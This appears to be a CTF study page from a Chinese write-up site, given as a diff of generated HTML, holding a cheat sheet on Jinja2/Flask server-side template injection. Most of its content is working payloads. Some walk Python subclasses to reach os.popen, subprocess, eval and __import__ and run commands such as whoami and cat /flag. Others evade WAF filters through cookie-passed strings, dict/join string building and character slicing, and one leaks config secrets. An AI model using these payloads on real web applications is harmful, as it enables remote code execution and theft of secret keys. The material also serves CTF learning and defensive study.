+      <a href="../../wp/ctfshow/web27-%E7%88%86%E7%A0%B4-%E8%BA%AB%E4%BB%BD%E8%AF%81%E5%8F%B7%E7%A0%81%E7%88%86%E7%A0%B4/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    web27-爆破-身份证号码爆破
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web28-%E7%88%86%E7%A0%B4-web%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    web28-爆破-web目录爆破
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web329-%E5%AD%98%E5%82%A8%E5%9E%8BXSS%2Bjquery%E9%80%89%E6%8B%A9%E5%99%A8%2BquerySelector%E9%80%89%E6%8B%A9%E5%99%A8%2BXSS%E6%95%B0%E6%8D%AE%E5%A4%96%E6%B3%84/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    web329-存储型XSS+jquery选择器+querySelector选择器+XSS数据外泄
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web329-%E5%AD%98%E5%82%A8%E5%9E%8BXSS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    web329 存储型XSS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web330-%E5%AD%98%E5%82%A8%E5%9E%8BXSS-GET-%E9%92%93%E9%B1%BC/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    web330 存储型XSS GET 钓鱼
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web331-%E5%AD%98%E5%82%A8%E5%9E%8BXSS-jQuery-POST--%E9%92%93%E9%B1%BC/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    web331 存储型XSS jQuery POST  钓鱼
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web359-ssrf-mysql/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web359 ssrf mysql
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web360-ssrf-redis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web360 ssrf redis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web369-ssti-%E4%B8%8B%E5%88%92%E7%BA%BF%E7%BB%95%E8%BF%87-%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87-%5B%5D%E7%BB%95%E8%BF%87-%7B%7B%E7%BB%95%E8%BF%87-%E8%BF%87%E6%BB%A4request/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web369 ssti 下划线绕过 引号绕过 []绕过 {{绕过 过滤request
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web370-ssti-%E4%B8%8B%E5%88%92%E7%BA%BF-%E5%BC%95%E5%8F%B7-%E6%95%B0%E5%AD%97/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web370 ssti 下划线 引号 数字
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web371-ssti-%7B%25%25%7D-print%E8%BF%87%E6%BB%A4-%E4%B8%8B%E5%88%92%E7%BA%BF-%E5%BC%95%E5%8F%B7-%E6%95%B0%E5%AD%97/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web371 ssti {%%} print过滤 下划线 引号 数字
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web79-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-php%E7%9F%AD%E6%A0%87%E7%AD%BE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    web79-文件包含-php短标签
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web80-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABnginx%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    web80-文件包含nginx日志包含
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web82-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%2Bsession%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    web82-文件包含-条件竞争+session临时文件注入
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web87-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%A6%99%E7%94%A8%E7%94%9F%E6%88%90%E4%B8%8D%E6%AD%BB%E9%A9%AC/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    web87-文件包含-php伪协议妙用生成不死马
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_6" id="__nav_4_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    三届长城杯
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    三届长城杯
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/%E4%B8%89%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF/AI_WAF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AI WAF
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_7" id="__nav_4_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    第一场考核赛
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    第一场考核赛
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/%E7%AC%AC%E4%B8%80%E5%9C%BA%E8%80%83%E6%A0%B8%E8%B5%9B/thinkphp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Thinkphp
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/%E7%AC%AC%E4%B8%80%E5%9C%BA%E8%80%83%E6%A0%B8%E8%B5%9B/%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%A7%98%E5%AF%86/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    教务系统的秘密
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#flask" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        FLASK
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="FLASK">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        常用模块和类
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        绕过
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+  <h1>SSTI</h1>
+
+<h2 id="flask">FLASK</h2>
+<pre><code class="language-jinja2">__class__：查看当前对象所属的类
+
+__mro__：查看当前类的继承关系（MethodResolutionOrder），通常用来找基类object
+
+__base__：查看当前类的直接父类
+
+__subclasses__()：列出当前运行环境下，该类所有的子类，自定义的类也在这里（这是寻找RCE插件的关键）
+
+__init__：类的初始化方法，访问构造函数，函数对象都有__globals__属性
+
+__globals__：函数所在模块的全局变量字典，获取该函数运行时的所有全局变量、函数和引用的模块（如果这个类所在的文件夹里引用了os，或者它能访问__builtins__，那么os模块就会出现在这个字典里）
+如果[]被禁__globals__要访问字典键可以：.os，.get(&quot;os&quot;)，|attr('os')，.__getitem__('os')，dict，request
+</code></pre>
+<pre><code class="language-jinja2">要是没有什么类,可以用可以找找__builtins__工具，包含了python所有内置函数
+</code></pre>
+<pre><code>有__class__属性的有：(),'',&quot;&quot;,[],config,request,self,lipsum,cycler,joiner,namespace,url_for,get_flashed_messages
+</code></pre>
+<pre><code>分隔符也可以改，开发者自定义
+{{}}：变量、表达式打印，有回显
+
+{%%}：语句、控制流，无回显，唯一有个print可以打印像
+例：{% if admin %} ... {% endif %}
+{% for i in range(10) %} ... {% endfor %}
+{% set a = 'os' %}
+
+{##}：注释，不会被执行
+
+#：行语句需要开启配置
+</code></pre>
+<pre><code class="language-jinja2">在jinja2中没有定义的变量值为Undefined对象
+</code></pre>
+<pre><code class="language-jinja2">过滤器(join,attr)没有参数，可以不加括号
+</code></pre>
+<pre><code class="language-jinja2">~：在jinja2中，在~两边的不管是什么都会被转成字符串，将字符连接在一起，如10~2=&gt;&quot;102&quot;,&quot;a&quot;~&quot;b&quot;=&quot;ab&quot;
+</code></pre>
+<h4 id="_1">常用模块和类</h4>
+<p><strong>os模块</strong></p>
+<pre><code class="language-jinja2">这是最直接的目标它通常隐藏在这些子类的__globals__中：
+
+os._wrap_close(Python3极常用，索引通常在前150个)
+
+warnings.catch_warnings(经典老牌)
+
+site._Printer
+
+linecache(因为它内部为了读取源码引用了os)
+例：
+{{().__class__.__bases__[0].__subclasses__()[索引].__init__.__globals__['os'].popen('whoami').read()}}
+{{''.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('ls').read()}}
+</code></pre>
+<p><strong>inspect.Signature</strong></p>
+<pre><code>?name={{''.__class__.__base__.__subclasses__()[290].__init__.__globals__['os'].popen('cat/flag').read()}}
+也有__builtins__
+</code></pre>
+<p><strong>subprocess.Popen</strong></p>
+<pre><code class="language-jinja2">subprocess.Popen(通常直接出现在subclasses列表中)
+
+例：{{().__class__.__bases__[0].__subclasses__()[索引]('ls',shell=True,stdout=-1).communicate()[0]}}
+communicate()会返回一个元组，两个元素标准输出和标准错误
+</code></pre>
+<p><strong>_frozen_importlib_external.FileLoader</strong></p>
+<pre><code class="language-jinja2">可用于绕过那些过滤了os、popen、eval或open的waf
+FileLoader是Python内部用来从硬盘加载文件的类它有一个内置方法叫get_data(0,path)，第一个参数是self，get_data不会用到self，所以可以随便传参，但省略会报错
+
+{{''.__class__.__base__.__subclasses__()[94][&quot;get_data&quot;](0,&quot;/flag&quot;)}}
+{{''.__class__.__base__.__subclasses__()[94].get_data(0,'/flag')}}
+</code></pre>
+<p><strong>traceback.TracebackException</strong></p>
+<pre><code class="language-jinja2">?name={{''.__class__.__base__.__subclasses__()[292].__init__.__globals__['linecache']['os'].popen('ls/').read()}}}}
+</code></pre>
+<p><strong>builtins模块</strong></p>
+<pre><code class="language-jinja2">__builtins__就像一个百宝箱，里面包含了Python所有的内置函数，如eval,__import__,open
+只要能访问到__globals__机会百分百__builtins__,而能访问__globals__的都是python写的，包括用户自定义的类
+常用入口类：site.Quitter,site._Printer,warnings.catch_warnings
+
+利用方式：
+
+执行eval：__globals__['__builtins__']['eval'](&quot;__import__('os').popen('id').read()&quot;)
+
+使用import：__globals__['__builtins__']['__import__']('os').system('ls')
+</code></pre>
+<p><strong>flask.json.tag.JSONTag</strong></p>
+<pre><code class="language-jinja2">{{''.__class__.__base__.__subclasses__()[446].__init__.__globals__['__builtins__']['eval'](&quot;__import__('os').popen('whoami').read()&quot;)}}
+</code></pre>
+<h4 id="_2">绕过</h4>
+<p>request对象</p>
+<pre><code class="language-jinja2">是flask就有，flask.*
+{{url_for.__globals__['request']}}
+{{get_flashed_messages.__globals__['request']}}
+request.args：解析后的URL查询字符串（GET参数）
+结构：?name=abc&amp;age=18，request.args.name调用
+{'name':'abc','age':'18'}
+
+request.form：POST请求中表单提交的数据
+结构：类似字典
+
+request.values：args和form的结合体
+
+request.cookies：客户端发送的所有Cookie
+SSTI价值：如果URL长度受限，可以将Payload放在Cookie里，通过request.cookies.mykey读取
+
+request.headers：所有的HTTP请求头
+结构：包含User-Agent,Referer,Host等
+SSTI价值：可以用request.headers['User-Agent']来读取数据
+
+request.method：请求方法（GET,POST,PUT等）
+
+request.path：请求的路径（不带域名和参数，如/login）
+
+request.url：完整的请求地址
+
+request.host：服务器的主机名（域名）
+
+request.remote_addr：客户端的真实IP地址
+
+request.files：上传的文件对象
+
+request.json：如果请求头是application/json，这里存放解析后的JSON数据
+
+?name={{().__class__.__base__.__subclasses__()[94][request.args.m1](0,request.args.m2)}}&amp;m1=get_data&amp;m2=/flag
+</code></pre>
+<p>pop函数</p>
+<pre><code class="language-jinja2">__subclasses__()是列表，__init__.__global__是字典都可以使用pop
+pop会删除并返回指定键的值，通常一次性会导致环境崩溃
+__subclasses__()[94]和__subclasses__().pop(94)值相等
+</code></pre>
+<p>lipsum函数</p>
+<pre><code class="language-jinja2">内置函数有__globals__属性,可以直接lipsum.__globals__
+拥有模块：os
+
+{{(lipsum|attr(request.cookies.m1)).get(request.cookies.m3).popen(request.cookies.m2).read()}}
+cookie：m1=__globals__;m2=cat /flag;m3=os
+{{ (lipsum|attr(request.cookies.n)|attr(request.cookies.k))(&quot;os&quot;).popen(request.cookies.m).read() }}
+cookie：n=__globals__;k=__getitem__;m=ls
+{{ (lipsum|attr(request.cookies.n))[request.cookies.k].popen(request.cookies.m).read() }}
+cookie：n=__globals__;k=os;m=ls
+{{(lipsum|attr(request.cookies.m1)).get(request.cookies.m3).popen(request.cookies.m2).read()}}
+cookie：m1=__globals__;m2=cat /flag;m3=os
+</code></pre>
+<p>|attr()过滤器</p>
+<pre><code class="language-jinja2">可以是字符串也可以是变量
+lipsum|attr(&quot;__init__&quot;)|attr(&quot;__globals__&quot;) 等于 lipsum.__init__.__globals__
+
+{{(lipsum|attr(request.cookies.m1)).os.popen(request.cookies.m2).read()}}
+Cookie：m1=__globals__;m2=cat /flag
+</code></pre>
+<p>{%%}分隔符</p>
+<pre><code class="language-jinja2">{%print((lipsum|attr(request.cookies.m1)).get(request.cookies.m3).popen(request.cookies.m2).read())%}
+cookie：m1=__globals__;m2=cat /flag;m3=os
+
+{% %}中可以写set定义变量，{{}}会报错
+</code></pre>
+<p>字符拼接绕过</p>
+<pre><code class="language-jinja2">dict：dict函数在创造字典时python会自动把赋值对象看成字符串
+例：dict(name=1)直接生成{&quot;name&quot;:1}
+join：对字典使用join时，join会把字典的所有键拼接成一个字符串，所以dict(po=a,p=a)|join可以生成&quot;pop&quot;，而a是占位符随便写
+
+{% set po=dict(po=a,p=a)|join%}         {#设置po为pop#}
+{% set a=(()|select|string|list)|attr(po)(24)%} {#{{()|select}}为&lt;generator object select_or_reject at 0x7fbdb99af220&gt;，pop(24)正好时下划线#}
+{% set ini=(a,a,dict(init=a)|join,a,a)|join()%} {#设置ini为__init__#}
+{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}  {#设置glo为__globals__#}
+{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%} {#设置geti为__getitem__#}
+{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}   {#设置built为__builtins__#}
+{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}{#设置x为q.__ini__.__globals__.__getitem__('__builtins')#}
+{% set chr=x.chr%}  {#提取__builtins__中的chr函数#}
+{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}{#构造文件路径/flag#}
+{%print(x.open(file).read())%}{#利用__builtins__.open('/flag').read()读取文件内容#}
+
+
+数字被过滤可以用count如{%set n=(dict(cccc=a)|join)|count%}将n赋值为4
+length：count被过滤可以用length替换，jinja2的length和count完全等价
+
+
+
+
+{%print(lipsum|string|list)%}
+输出：
+['&lt;', 'f', 'u', 'n', 'c', 't', 'i', 'o', 'n', ' ', 'g', 'e', 'n', 'e', 'r', 'a', 't', 'e', '_', 'l', 'o', 'r', 'e', 'm', '_', 'i', 'p', 's', 'u', 'm', ' ', 'a', 't', ' ', '0', 'x', '7', 'f', '6', 'b', 'f', '3', 'e', '4', 'c', '5', '5', '0', '&gt;']
+而我们要在这些字符中把我们想要的一个个拼起来
+例：
+{%set gl=(((lipsum|string|list).pop(18))~((lipsum|string|list).pop(18))~((lipsum|string|list).pop(10))~((lipsum|string|list).pop(19))~((lipsum|string|list).pop(7))~((lipsum|string|list).pop(40))~((lipsum|string|list).pop(31))~((lipsum|string|list).pop(19))~((lipsum|string|list).pop(27))~((lipsum|string|list).pop(18))~((lipsum|string|list).pop(18)))%}
+{%print(lipsum|attr(gl))%}
+gl为__globals__
+</code></pre>
+<p>框架内置对象(Flask/Jinja2特有)</p>
+<pre><code class="language-jinja2">不需要从''出发，直接在模板中就能拿到的对象
+config:泄露SECRET_KEY、数据库连接密码{{config}}
+request:利用请求对象{{request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read()}}
+url_for/get_flashed_messages:{{url_for.__globals__['os'].popen('ls').read()}}
+</code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.tabs", "navigation.indexes", "navigation.top", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
